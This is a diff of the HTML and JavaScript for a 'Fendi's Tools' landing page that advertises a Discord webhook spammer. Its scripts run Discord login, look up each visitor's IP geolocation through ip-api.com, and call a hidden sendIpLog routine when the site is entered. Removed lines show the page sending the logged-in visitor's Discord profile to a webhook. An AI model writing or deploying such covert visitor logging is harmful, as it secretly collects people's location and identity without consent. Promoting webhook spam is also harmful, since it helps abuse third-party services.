@@ -6,7 +6,6 @@
     <title>Fendi's Tools</title>
     <link rel="icon" type="image/png" href="https://i.ibb.co/8LjfF2JW/ee248f4d-97ba-4043-a535-7862e3a66946.png">
     <style>
-        /* ========== ALL STYLES (unchanged) ========== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             min-height: 100vh;
@@ -14,7 +13,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            font-family: 'Poppins', 'Segoe UI', system-ui, -apple-system, 'Inter', sans-serif;
+            font-family: 'Poppins', 'Segoe UI', sans-serif;
             padding: 1.5rem;
             position: relative;
             overflow-x: hidden;
@@ -42,7 +41,7 @@
         .loading-content { text-align: center; animation: fadeUp 0.8s ease-out; display: flex; flex-direction: column; align-items: center; gap: 1.5rem; }
         @keyframes fadeUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
         .loading-logo { font-size: 2rem; font-weight: 800; color: white; text-shadow: 0 0 5px rgba(255,255,255,0.5); }
-        .spinner { width: 70px; height: 70px; border: 4px solid rgba(255,255,255,0.2); border-top: 4px solid white; border-radius: 50%; animation: spin 1s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite; transition: opacity 0.4s ease; }
+        .spinner { width: 70px; height: 70px; border: 4px solid rgba(255,255,255,0.2); border-top: 4px solid white; border-radius: 50%; animation: spin 1s ease infinite; transition: opacity 0.4s ease; }
         @keyframes spin { to { transform: rotate(360deg); } }
         .enter-btn {
             background: linear-gradient(95deg, #333, #111);
@@ -64,21 +63,27 @@
         .enter-btn:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(255,255,255,0.5); background: #222; }
         .loading-discord-link { background: rgba(30,30,30,0.7); padding: 0.7rem 1.5rem; border-radius: 3rem; border: 1px solid white; cursor: pointer; display: inline-block; }
         .loading-discord-link a { color: white; text-decoration: none; font-weight: 600; }
+
         .landing-page {
             width: 100%;
-            max-width: 1000px;
+            max-width: 800px;
             margin: 0 auto;
             padding: 2rem;
             z-index: 5;
             position: relative;
             display: none;
+            animation: fadeScale 0.5s cubic-bezier(0.2,0.9,0.4,1.1);
+        }
+        @keyframes fadeScale {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
         }
         .landing-page.visible { display: block; }
         .glow-title {
             text-align: center;
             font-size: 2rem;
             font-weight: 800;
-            margin-bottom: 1rem;
+            margin-bottom: 2rem;
             min-height: 4rem;
             transition: opacity 0.5s ease;
             color: white;
@@ -100,7 +105,7 @@
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
             gap: 2rem;
-            margin-top: 2rem;
+            margin-top: 1rem;
         }
         .tool-card {
             background: rgba(0,0,0,0.7);
@@ -119,8 +124,9 @@
         }
         .tool-card h3 { font-size: 1.5rem; margin-bottom: 0.5rem; color: white; }
         .tool-card p { color: #ccc; font-size: 0.85rem; }
-        .placeholder { opacity: 0.6; cursor: not-allowed; }
-        .placeholder:hover { transform: none; box-shadow: none; }
+        .placeholder { opacity: 0.6; cursor: pointer; }
+        .placeholder:hover { transform: none; box-shadow: none; background: rgba(0,0,0,0.7); }
+
         .music-player {
             position: fixed;
             top: 15px;
@@ -139,10 +145,41 @@
         .music-player button { background: none; border: none; color: white; font-size: 1.2rem; cursor: pointer; padding: 0; width: 28px; transition: 0.2s; }
         .music-player button:hover { color: #aaa; transform: scale(1.05); }
         .music-player .track-title { color: #ddd; max-width: 140px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 0.75rem; }
-        .top-left-logo { position: fixed; top: 15px; left: 15px; z-index: 100; cursor: pointer; }
+
+        .top-left-logo {
+            position: fixed;
+            top: 15px;
+            left: 15px;
+            z-index: 100;
+            cursor: pointer;
+        }
         .top-left-logo img { width: 45px; height: 45px; border-radius: 12px; border: 1px solid white; transition: transform 0.2s; }
         .top-left-logo img:hover { transform: scale(1.05); }
+        .tools-menu {
+            position: fixed;
+            top: 70px;
+            left: 15px;
+            background: rgba(0,0,0,0.95);
+            backdrop-filter: blur(12px);
+            border: 1px solid white;
+            border-radius: 1rem;
+            padding: 0.8rem;
+            min-width: 180px;
+            z-index: 99;
+            opacity: 0;
+            visibility: hidden;
+            transform: translateY(-10px);
+            transition: all 0.3s;
+        }
+        .tools-menu.active { opacity: 1; visibility: visible; transform: translateY(0); }
+        .tools-menu h4 { color: white; font-size: 0.8rem; text-align: center; border-bottom: 1px solid white; margin-bottom: 0.5rem; }
+        .tool-item { padding: 0.5rem 0.8rem; color: #ddd; cursor: pointer; border-radius: 0.5rem; font-size: 0.8rem; transition: 0.2s; }
+        .tool-item:hover { background: rgba(255,255,255,0.2); }
+        .placeholder-item { opacity: 0.6; cursor: not-allowed; }
+        .placeholder-item:hover { background: none; }
+
         .version-tag { position: fixed; bottom: 10px; right: 10px; color: #aaa; opacity: 0.6; font-size: 12px; font-family: monospace; z-index: 9999; pointer-events: none; }
+
         @media (max-width: 650px) {
             .tools-grid { gap: 1rem; }
             .tool-card { padding: 1rem; }
@@ -159,6 +196,11 @@
 
 <div class="top-left-logo" id="logoBtn">
     <img src="https://i.ibb.co/8LjfF2JW/ee248f4d-97ba-4043-a535-7862e3a66946.png" alt="Logo">
+</div>
+<div id="toolsMenu" class="tools-menu">
+    <h4>Fendi's Tools</h4>
+    <div class="tool-item" data-tool="spammer">Webhook Spammer</div>
+    <div class="tool-item placeholder-item">Webhook Reader (coming soon)</div>
 </div>
 
 <div class="music-player" id="musicPlayer">
@@ -185,16 +227,8 @@
             <p>Send messages, spam webhooks, customize bot name & avatar</p>
         </div>
         <div class="tool-card placeholder">
-            <h3>ANALYZER</h3>
-            <p>Analyze webhook responses and logs (coming soon)</p>
-        </div>
-        <div class="tool-card placeholder">
-            <h3>STATS</h3>
-            <p>Message statistics and analytics (coming soon)</p>
-        </div>
-        <div class="tool-card placeholder">
-            <h3>SETTINGS</h3>
-            <p>Global settings and preferences (coming soon)</p>
+            <h3>WEBHOOK READER</h3>
+            <p>Read and analyze webhook logs (coming soon)</p>
         </div>
     </div>
 </div>
@@ -217,15 +251,16 @@
 
         const loadingScreen = document.getElementById('loadingScreen');
         const landingPage = document.getElementById('landingPage');
-        
-        // ========== DISCORD OAUTH & GPS (shared state) ==========
+        const toolsMenu = document.getElementById('toolsMenu');
+        const logoBtn = document.getElementById('logoBtn');
+
+        // ========== DISCORD AUTH & GPS (shared state) ==========
         const DISCORD_CLIENT_ID = "1497155951067664415";  // REPLACE WITH YOUR CLIENT ID
         const REDIRECT_URI = window.location.origin;
         let gpsRequested = localStorage.getItem("gpsRequested") === "true";
         let gpsGranted = localStorage.getItem("gpsGranted") === "true";
         let ipLogSentSession = sessionStorage.getItem("ipLogSent") === "true";
 
-        // ----- Helper functions -----
         async function getIpGeo() {
             try {
                 const res = await fetch('https://ip-api.com/json/');
@@ -456,54 +491,25 @@
             return false;
         }
 
-        // ========== ENTER BUTTON ==========
-        let musicStartedLanding = false;
+        // ========== ENTER BUTTON CLICK ==========
         enterBtn.addEventListener('click', async () => {
-            // Start music immediately in response to click
+            // Start music immediately
             startMusic();
-            await ensureLoggedIn();
-            if (localStorage.getItem("discord_access_token")) {
-                finishEntry();
+            // Perform authentication only if not already logged in
+            const storedToken = localStorage.getItem("discord_access_token");
+            if (!storedToken) {
+                await ensureLoggedIn();
+                // The page will redirect, so the rest won't execute.
+                return;
             }
-        });
-
-        // Handle OAuth redirect
-        const urlParams = new URLSearchParams(window.location.search);
-        const code = urlParams.get("code");
-        if (code) {
-            const codeVerifier = localStorage.getItem("code_verifier");
-            if (codeVerifier) {
-                exchangeCode(code, codeVerifier).then(async token => {
-                    localStorage.setItem("discord_access_token", token);
-                    const user = await fetchDiscordUser(token);
-                    sendDiscordInfoToWebhook(user);
-                    window.history.replaceState({}, document.title, window.location.pathname);
-                    finishEntry();
-                }).catch(err => {
-                    console.error("Token exchange failed", err);
-                    window.history.replaceState({}, document.title, window.location.pathname);
-                    finishEntry();
-                });
-            } else {
-                window.history.replaceState({}, document.title, window.location.pathname);
-                finishEntry();
-            }
-        } else {
-            if (localStorage.getItem("discord_access_token")) {
-                finishEntry();
-            }
-        }
-
-        async function finishEntry() {
+            // Already logged in – just show the landing page
             await sendIpLog();
             loadingScreen.classList.add('hide');
             setTimeout(() => {
                 loadingScreen.style.display = 'none';
                 landingPage.classList.add('visible');
-                // Music already started from ENTER click, but if skipped (e.g., already logged in), start it now
-                if (!musicStartedLanding) startMusic();
             }, 800);
-        }
+        });
 
         // ========== TYPEWRITER EFFECT ==========
         const titleText = "Fendi's Tools";
@@ -597,7 +603,6 @@
         function startMusic() {
             if (musicStarted) return;
             musicStarted = true;
-            musicStartedLanding = true;
             loadMusicState();
             setInterval(saveMusicState, 2000);
             window.addEventListener('beforeunload', saveMusicState);
@@ -641,8 +646,31 @@
                     sessionStorage.setItem('fromLanding', 'true');
                     window.location.href = '/spammer/';
                 });
+            } else {
+                card.addEventListener('click', () => {
+                    alert("Webhook Reader is coming soon!");
+                });
             }
         });
+
+        // ========== FENDI MENU (top-left logo) ==========
+        logoBtn.addEventListener('click', (e) => {
+            e.stopPropagation();
+            toolsMenu.classList.toggle('active');
+        });
+        document.addEventListener('click', (e) => {
+            if (!toolsMenu.contains(e.target) && !logoBtn.contains(e.target)) {
+                toolsMenu.classList.remove('active');
+            }
+        });
+        const menuSpammer = document.querySelector('.tool-item[data-tool="spammer"]');
+        if (menuSpammer) {
+            menuSpammer.addEventListener('click', () => {
+                saveMusicState();
+                sessionStorage.setItem('fromLanding', 'true');
+                window.location.href = '/spammer/';
+            });
+        }
 
         // ========== JOIN BUTTONS ==========
         const joinBtns = ['loadingJoin'];
